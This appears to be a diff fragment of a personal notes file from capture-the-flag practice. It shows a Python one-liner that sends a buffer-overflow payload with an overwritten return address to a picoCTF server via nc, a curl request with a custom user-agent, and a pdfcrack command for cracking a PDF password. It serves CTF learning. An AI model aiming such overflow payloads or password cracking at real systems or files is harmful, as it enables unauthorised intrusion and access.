@@ -132,3 +132,7 @@ write into buffered memory -->
 python -c 'import sys; sys.stdout.buffer.write(b"\x32\x0a" + (b"\x41" * 32) + b"\xa0\x11\x40\x00" + b"\x0a\x34\x0a")' | nc mimas.picoctf.net 58500
 
 
+curl --user-agent "priyo" "https://agent.cseduic.org" 
+
+
+pdfcrack -f attentionx.pdf
